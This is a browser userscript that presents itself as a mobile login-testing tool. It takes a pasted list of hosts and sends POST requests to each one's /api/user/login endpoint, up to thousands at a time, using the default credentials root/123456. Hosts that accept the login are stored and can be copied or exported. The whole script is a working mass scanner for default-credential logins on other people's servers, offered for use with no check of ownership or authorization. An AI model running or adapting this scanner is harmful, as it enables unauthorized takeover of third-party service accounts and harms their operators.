// ==UserScript==
// @name         root newapi测验
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Mobile optimized login testing tool with floating button
// @author       Your name
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @downloadURL https://update.greasyfork.org/scripts/521572/root%20newapi%E6%B5%8B%E9%AA%8C.user.js
// @updateURL https://update.greasyfork.org/scripts/521572/root%20newapi%E6%B5%8B%E9%AA%8C.meta.js
// ==/UserScript==
(function () {
    'use strict';
    // 配置项
    const CONFIG = {
        MAX_CONCURRENT_REQUESTS: 1000,  // 默认最大并发数
        REQUEST_TIMEOUT: 1000,          // 请求超时时间
        BUTTON_SIZE: 50,
        HIDE_DELAY: 2000,
        DOUBLE_TAP_DELAY: 500
    };
    // 全局变量
    let isPaused = false;
    let shouldStop = false;
    // 创建浮动按钮
    function createFloatingButton() {
        const button = document.createElement('div');
        button.className = 'float-button';
        button.style.cssText = `
            position: fixed;
            width: ${CONFIG.BUTTON_SIZE}px;
            height: ${CONFIG.BUTTON_SIZE}px;
            background: rgba(0, 123, 255, 0.8);
            border-radius: ${CONFIG.BUTTON_SIZE / 2}px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            cursor: pointer;
            user-select: none;
            touch-action: none;
            z-index: 2147483646;
            transition: all 0.3s ease;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            right: 0;
            top: 50%;
            transform: translateX(${CONFIG.BUTTON_SIZE / 2}px);
        `;
        button.textContent = '测';
        let isDragging = false;
        let lastTapTime = 0;
        let lastX = 0;
        let lastY = 0;
        let startX = 0;
        let startY = 0;
        let hideTimeout;
        function autoHide() {
            clearTimeout(hideTimeout);
            hideTimeout = setTimeout(() => {
                if (!isDragging) {
                    const rect = button.getBoundingClientRect();
                    const centerX = rect.left + rect.width / 2;
                    const screenWidth = window.innerWidth;
                    if (centerX < screenWidth / 2) {
                        button.style.transform = `translateX(-${CONFIG.BUTTON_SIZE / 2}px)`;
                        button.style.left = '0';
                        button.style.right = 'auto';
                    } else {
                        button.style.transform = `translateX(${CONFIG.BUTTON_SIZE / 2}px)`;
                        button.style.right = '0';
                        button.style.left = 'auto';
                    }
                }
            }, CONFIG.HIDE_DELAY);
        }
        function handleTouchStart(e) {
            const touch = e.touches[0];
            isDragging = true;
            startX = touch.clientX;
            startY = touch.clientY;
            lastX = button.offsetLeft;
            lastY = button.offsetTop;
            const currentTime = new Date().getTime();
            const tapLength = currentTime - lastTapTime;
            if (tapLength < CONFIG.DOUBLE_TAP_DELAY && tapLength > 0) {
                togglePanel(true);
                e.preventDefault();
            }
            lastTapTime = currentTime;
            button.style.transition = 'none';
            clearTimeout(hideTimeout);
        }
        function handleTouchMove(e) {
            if (!isDragging) return;
            const touch = e.touches[0];
            const deltaX = touch.clientX - startX;
            const deltaY = touch.clientY - startY;
            let newX = lastX + deltaX;
            let newY = lastY + deltaY;
            const maxX = window.innerWidth - button.offsetWidth;
            const maxY = window.innerHeight - button.offsetHeight;
            newX = Math.max(0, Math.min(newX, maxX));
            newY = Math.max(0, Math.min(newY, maxY));
            button.style.left = `${newX}px`;
            button.style.top = `${newY}px`;
            button.style.transform = 'none';
            button.style.right = 'auto';
            e.preventDefault();
        }
        function handleTouchEnd() {
            isDragging = false;
            button.style.transition = 'all 0.3s ease';
            autoHide();
        }
        function togglePanel(forceOpen = false) {
            const panel = document.querySelector('.login-tester-panel');
            if (panel) {
                if (forceOpen) {
                    panel.style.display = 'block';
                } else {
                    panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
                }
            }
        }
        button.addEventListener('touchstart', handleTouchStart, false);
        button.addEventListener('touchmove', handleTouchMove, false);
        button.addEventListener('touchend', handleTouchEnd, false);
        button.addEventListener('click', () => {
            if (!isDragging) {
                togglePanel();
            }
        });
        autoHide();
        window.addEventListener('resize', autoHide);
        return button;
    }
    // 优化测试函数
    function testLogin(host) {
        return new Promise((resolve) => {
            GM_xmlhttpRequest({
                method: "POST",
                url: `${host}/api/user/login?turnstile=`,
                headers: { "content-type": "application/json" },
                data: JSON.stringify({ username: "root", password: "123456" }),
                timeout: CONFIG.REQUEST_TIMEOUT,
                onload: function (response) {
                    try {
                        if (response.status === 200 && JSON.parse(response.responseText).success === true) {
                            const successUrls = GM_getValue('successUrls', []);
                            if (!successUrls.includes(host)) {
                                successUrls.push(host);
                                GM_setValue('successUrls', successUrls);
                            }
                            resolve({ success: true, host });
                        } else {
                            resolve({ success: false, host });
                        }
                    } catch {
                        resolve({ success: false, host });
                    }
                },
                onerror: () => resolve({ success: false, host }),
                ontimeout: () => resolve({ success: false, host })
            });
        });
    }
    // 优化结果显示
    function updateResult(result, resultArea) {
        // 只显示成功的结果
        if (result.success) {
            const p = document.createElement('p');
            p.style.cssText = 'margin: 2px 0; font-size: 12px; color: green;';
            p.textContent = `成功: ${result.host}`;
            resultArea.appendChild(p);
            resultArea.scrollTop = resultArea.scrollHeight;
        }
    }
    // 优化测试运行函数
    async function runTests(urls, resultArea, concurrentRequests, pauseButton, stopButton) {
        // 显示进度
        const progressText = document.createElement('div');
        progressText.style.cssText = 'margin-bottom: 5px; font-size: 12px;';
        resultArea.parentNode.insertBefore(progressText, resultArea);
        let completed = 0;
        const total = urls.length;
        const updateProgress = () => {
            completed++;
            progressText.textContent = `进度: ${completed}/${total} (${Math.round(completed / total * 100)}%)`;
        };
        // 分批处理
        isPaused = false;
        shouldStop = false;
        
        const waitForResume = async () => {
            while (isPaused && !shouldStop) {
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            return !shouldStop;
        };
        const batchSize = concurrentRequests;
        for (let i = 0; i < urls.length; i += batchSize) {
            // 检查是否应该停止
            if (shouldStop) {
                progressText.textContent += " 已停止！";
                return;
            }
            
            // 如果暂停，等待恢复
            if (isPaused) {
                progressText.textContent = `进度: ${completed}/${total} (${Math.round(completed / total * 100)}%) - 已暂停`;
                const shouldContinue = await waitForResume();
                if (!shouldContinue) {
                    progressText.textContent += " 已停止！";
                    return;
                }
                progressText.textContent = `进度: ${completed}/${total} (${Math.round(completed / total * 100)}%)`;
            }
            const batch = urls.slice(i, Math.min(i + batchSize, urls.length));
            const promises = batch.map(url =>
                testLogin(url).then(result => {
                    updateResult(result, resultArea);
                    updateProgress();
                    return result;
                })
            );
            await Promise.all(promises);
        }
        // 检测完成后提示
        progressText.textContent += " 检测完成！";
        
        // 重置按钮状态
        isPaused = false;
        shouldStop = false;
        pauseButton.textContent = "暂停";
        pauseButton.style.background = "#FF9800";
    }
    // 创建复制到剪贴板的函数（兼容移动设备）
    function copyToClipboard(text) {
        // 创建文本区域
        const textArea = document.createElement('textarea');
        textArea.value = text;
        textArea.style.position = 'fixed';  // 避免滚动到底部
        textArea.style.left = '0';
        textArea.style.top = '0';
        textArea.style.opacity = '0';
        document.body.appendChild(textArea);
        
        // 在iOS上，需要设置可编辑并选中
        textArea.contentEditable = true;
        textArea.readOnly = false;
        
        // 选择文本
        textArea.select();
        textArea.setSelectionRange(0, 99999); // 对于移动设备
        
        // 复制
        let successful = false;
        try {
            successful = document.execCommand('copy');
        } catch (err) {
            console.error('无法复制文本: ', err);
        }
        
        // 移除元素
        document.body.removeChild(textArea);
        
        return successful;
    }
    // 创建主界面
    function createUI() {
        const panel = document.createElement('div');
        panel.className = 'login-tester-panel';
        panel.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 15px;
            padding-top: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.2);
            z-index: 2147483647;
            display: none;
            max-width: 90vw;
            max-height: 90vh;
            overflow: auto;
        `;
        // 添加关闭按钮
        const closeButton = document.createElement('div');
        closeButton.style.cssText = `
            position: absolute;
            top: 10px;
            right: 10px;
            width: 20px;
            height: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            color: #666;
            transition: color 0.3s ease;
        `;
        closeButton.innerHTML = '×';
        closeButton.onclick = () => {
            panel.style.display = 'none';
        };
        closeButton.onmouseover = () => {
            closeButton.style.color = '#000';
        };
        closeButton.onmouseout = () => {
            closeButton.style.color = '#666';
        };
        const textarea = document.createElement('textarea');
        textarea.placeholder = '输入URL列表(每行一个)';
        textarea.style.cssText = `
            width: 300px;
            height: 150px;
            margin-bottom: 10px;
            padding: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        `;
        // 添加并发数输入框
        const configContainer = document.createElement('div');
        configContainer.style.cssText = 'display: flex; align-items: center; margin-bottom: 10px;';
        
        const concurrentLabel = document.createElement('label');
        concurrentLabel.textContent = '最大并发数: ';
        concurrentLabel.style.cssText = 'font-size: 14px; margin-right: 5px;';
        
        const concurrentInput = document.createElement('input');
        concurrentInput.type = 'number';
        concurrentInput.min = '1';
        concurrentInput.max = '5000';
        concurrentInput.value = CONFIG.MAX_CONCURRENT_REQUESTS;
        concurrentInput.style.cssText = `
            width: 80px;
            padding: 3px 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        `;
        
        configContainer.append(concurrentLabel, concurrentInput);
        const buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = 'display: flex; gap: 10px; margin-bottom: 10px; flex-wrap: wrap;';
        const startButton = document.createElement('button');
        startButton.textContent = '开始测试';
        startButton.style.cssText = `
            padding: 5px 10px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 5px;
        `;
        const pauseButton = document.createElement('button');
        pauseButton.textContent = '暂停';
        pauseButton.style.cssText = startButton.style.cssText + 'background: #FF9800;';
        pauseButton.disabled = true;
        const stopButton = document.createElement('button');
        stopButton.textContent = '停止';
        stopButton.style.cssText = startButton.style.cssText + 'background: #F44336;';
        stopButton.disabled = true;
        const copyButton = document.createElement('button');
        copyButton.textContent = '复制结果';
        copyButton.style.cssText = startButton.style.cssText + 'background: #2196F3;';
        const copyStatus = document.createElement('span');
        copyStatus.style.cssText = 'margin-left: 5px; font-size: 12px; display: none;';
        const exportButton = document.createElement('button');
        exportButton.textContent = '导出结果';
        exportButton.style.cssText = startButton.style.cssText + 'background: #FF9800;';
        const resultArea = document.createElement('div');
        resultArea.style.cssText = `
            max-height: 200px;
            overflow-y: auto;
            border: 1px solid #ccc;
            padding: 5px;
            border-radius: 5px;
            font-size: 12px;
        `;
        panel.appendChild(closeButton);
        buttonContainer.append(startButton, pauseButton, stopButton, copyButton, exportButton, copyStatus);
        panel.append(textarea, configContainer, buttonContainer, resultArea);
        document.body.appendChild(panel);
        // 暂停/继续功能
        pauseButton.onclick = () => {
            if (isPaused) {
                isPaused = false;
                pauseButton.textContent = "暂停";
                pauseButton.style.background = "#FF9800";
            } else {
                isPaused = true;
                pauseButton.textContent = "继续";
                pauseButton.style.background = "#4CAF50";
            }
        };
        // 停止功能
        stopButton.onclick = () => {
            shouldStop = true;
            isPaused = false;
            pauseButton.textContent = "暂停";
            pauseButton.style.background = "#FF9800";
        };
        // 复制结果
        copyButton.onclick = () => {
            const successUrls = GM_getValue('successUrls', []);
            if (successUrls.length > 0) {
                const text = successUrls.join('\n');
                const success = copyToClipboard(text);
                
                copyStatus.textContent = success ? "✓ 已复制" : "✗ 复制失败";
                copyStatus.style.color = success ? "green" : "red";
                copyStatus.style.display = "inline";
                
                setTimeout(() => {
                    copyStatus.style.display = "none";
                }, 2000);
            } else {
                copyStatus.textContent = "没有结果可复制";
                copyStatus.style.color = "orange";
                copyStatus.style.display = "inline";
                
                setTimeout(() => {
                    copyStatus.style.display = "none";
                }, 2000);
            }
        };
        // 导出结果
        exportButton.onclick = () => {
            const successUrls = GM_getValue('successUrls', []);
            if (successUrls.length > 0) {
                const blob = new Blob([successUrls.join('\n')], { type: 'text/plain;charset=utf-8' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'success_urls.txt';
                a.click();
                URL.revokeObjectURL(url);
            }
        };
        // 开始测试
        startButton.onclick = async () => {
            resultArea.innerHTML = '';
            GM_setValue('successUrls', []);
            const urls = textarea.value
                .split('\n')
                .map(url => url.trim())
                .filter(url => url)
                .map(url => url.startsWith('http') ? url : `http://${url}`);
            if (urls.length > 0) {
                startButton.disabled = true;
                pauseButton.disabled = false;
                stopButton.disabled = false;
                
                startButton.textContent = '测试中...';
                
                // 获取用户设置的并发数
                const concurrentRequests = parseInt(concurrentInput.value) || CONFIG.MAX_CONCURRENT_REQUESTS;
                
                try {
                    await runTests(urls, resultArea, concurrentRequests, pauseButton, stopButton);
                } catch (error) {
                    console.error(error);
                } finally {
                    startButton.disabled = false;
                    pauseButton.disabled = true;
                    stopButton.disabled = true;
                    startButton.textContent = '开始测试';
                }
            }
        };
        return { textarea, startButton, resultArea, concurrentInput };
    }
    // 添加样式
    const style = document.createElement('style');
    style.textContent = `
        .float-button:active {
            transform: scale(0.95) !important;
        }
        @media (max-width: 768px) {
            .login-tester-panel {
                width: 90vw;
            }
        }
    `;
    document.head.appendChild(style);
    // 初始化
    function init() {
        createUI();
        document.body.appendChild(createFloatingButton());
    }
    // 启动脚本
    init();
})();